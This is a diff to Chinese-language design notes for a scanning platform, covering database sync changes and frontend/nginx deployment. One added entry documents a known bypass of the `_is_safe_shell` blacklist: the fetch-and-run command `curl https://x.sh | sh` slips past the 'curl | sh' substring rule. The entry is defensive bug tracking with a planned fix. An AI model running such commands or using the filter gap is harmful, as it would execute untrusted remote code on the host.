@@ -38,6 +38,8 @@
 
 - **[PG 增量同步 + 资产聚合表（2026-08-31）]** 原 `upsert_to_pg` 每次被旁路写入触发时**全量**读本地 recon 五表全量 upsert，任务高频写入时 create_task 并发堆积有性能压力；且 `recon_endpoints`（端点/资产）从未进 PG，目标全景图缺资产视图。**改造**：① 本地 `recon_facts`/`recon_endpoints`/`recon_threats` 三表加 `pg_synced_at` 脏标记列（NULL=脏），旧库 `_ensure_column` 幂等 `ALTER TABLE ADD COLUMN` 补齐；② 四个 upsert（fact/endpoint/technique/threat）更新已有行时自动置脏；③ `upsert_to_pg` 只读脏行 → PG upsert → **PG 提交成功后**打标（失败不打标，下次重试不丢数据）；④ `_recon_emit_sync` 改 per-task in-flight 合并（同步期间新写入标记 `_recon_sync_pending` 补一轮），不再每次写入 create_task；⑤ 新增 PG 资产聚合表 `recon_endpoints_agg`（`pobi_v2/db/recon_models.py` + alembic `0017_recon_endpoints_agg.py`），`seed_from_pg` 续扫时从该表灌入本地结构化端点；⑥ 新增 `GET /api/v1/targets/{id}/assets` 返回目标资产清单。**顺带修复收敛 bug**：原 `on_conflict_do_update` 用 `where=excluded.confidence > current` 整行门控，导致同键内容更新但置信度未提升时 PG 静默过期；改为**内容字段最新 wins + confidence 取 `GREATEST(旧,新)`**。**约束**：① 任何"更新已有行"的写入路径必须置脏 `pg_synced_at=NULL`，否则增量同步漏更新；② 打标必须在 PG 提交成功后执行（失败不打标，靠脏标记重试）；③ 新本地库建表含 `pg_synced_at`，旧库依赖 `_ensure_column` 幂等补列，禁止删该列。
 
+- **[`_is_safe_shell` 词法解析漏洞（2026-08-31 记录，暂未修复）]** `pobi_v2/engine/scan_tools.py` 的 `_is_safe_shell` 用**静态子串黑名单**做极简防护，存在绕过：黑名单 `"curl | sh"`/`"wget | sh"` 要求两个词紧邻，而 `curl https://x.sh | sh`（URL 隔断）无法命中；随后命中白名单前缀 `"curl"` 被判定安全 → **`curl <任意URL> | sh` 可绕过第一层防御**。证据：`tests/test_engine_tools.py::test_unsafe_shell_blocked[curl https://x.sh | sh]` 失败（期望拦截、实际放行）。**已知影响范围**：该工具属 `ScanWorkflow`（无 Docker 沙箱的轻量回退路径）的基础防护层，真实高危命令仍会被 `engine/approval.py` 审批 gate 二次拦截，故当前不构成直接利用面，但防御纵深第一层已静默失守。**修复方向（待实施）**：改用 `shlex.split` 词法解析，检测「下载类命令（curl/wget）+ `|` 管道 + `sh`/`bash` 解释器」组合，替换子串匹配；同时补充带 URL 中间隔的用例到测试参数化列表。**约束**：修复时不得破坏 `ScanWorkflow` 对合法只读探测命令（curl/wget 直连等）的放行语义。
+
 ## 目录结构约定（agent 产物路径）
 
 - **[扁平化：去掉 agent_id / session_id 嵌套层]** 任务级 agent 产物统一归口到
@@ -61,7 +63,7 @@
 
 - **[CORS]** dev `allow_origins=["*"]` + `allow_credentials=True` 并存（源码现状），但 `AGENTS.md` 要求生产收敛为具体 origin，且禁止 `*` 与 credentials 同用。生产须改 `POBI_V2_CORS_ORIGINS`。
 - **[Dockerfile.prod]** 强制多阶段构建（编译工具与运行时隔离）；`docker-compose.yml` 镜像强制阿里云 ACR 前缀，禁止官方裸镜像（如 `mongo:7.0`，应 `redis:7-alpine` 等 ACR 前缀）。
-- **[前端零构建]** 纯静态 SPA，FastAPI 直接挂载 `web/`，不引入 Node/打包；nginx 开启 Gzip 且对 `/api/v1/tasks/` 关闭代理缓冲以保证 SSE 实时。
+- **[前端双形态共存（2026-08-31 落地，2026-09-01 调整部署）]** 前端由两套并存，但**对外仅暴露 React 版**：① **零构建版** `web/index.html`+`web/static/` 仍保留在磁盘（无 Node 构建环境可回退），但**不再经 nginx 对外暴露**；② **React 版** `webapp/`（Vite 工程）经 `npm run build` 输出到 `web/spa/`，`base=/`（2026-09-01 由 `/app/` 改为根路径），由 nginx **根目录直接静态托管**（`web` 服务挂载 `./web/spa:/usr/share/nginx/html:ro`），`/` 即 React 控制台。`/app/` 作为**兼容别名**保留，反代到 FastAPI 的 `/app` 路由（仍托管 `web/spa`）。**约束**：① 零构建版文件保留、禁止删除（回退用途）；② React 改动只在 `webapp/`，`web/spa/` 是构建产物**禁止手工编辑**；③ 部署前必须 `cd webapp && npm run build`（产物进 `web/spa`）再 `docker compose up -d web`；④ nginx `web` 服务挂载点是 `./web/spa` 而非 `./web`；若改回旧版需改回挂载 `./web` 并切换 `location /` 根；⑤ SSE 经 `/api/v1/tasks/{id}/stream`，在 nginx 独立 location 已 `proxy_buffering off`，实时性有保障。
 - **[nginx 反向代理]** 当前架构保留 `web`（nginx）作为边界层，价值与取舍如下：
   - **保留理由**：① 强制 Gzip（uvicorn 默认不压缩，批量任务大 JSON 直推前端会明显变慢）；② SSE 长连接统一在反代层关闭代理缓冲（`proxy_buffering off` / `read_timeout 3600s`），`/api/v1/tasks/{id}/stream` 实时性更有保障；③ 统一 80 端口暴露，前端同源走 `/api` 前缀无需跨端口；④ 对外发布时可在此层加 HTTPS/限流而无需改应用代码。
   - **代价 / 风险**：开源版 nginx 对 `upstream` 内域名**只在启动时解析一次并永久缓存**；api 容器重启后 IP 漂移，nginx 仍连旧地址（撞到其它容器 8000 端口）会稳定 502。已用 `resolver 127.0.0.11 valid=10s ipv6=off` + 变量形式 `proxy_pass http://$api_upstream`（无尾斜杠，避免吞 URI）根治，见 `nginx.conf` / `nginx.dev.conf`。
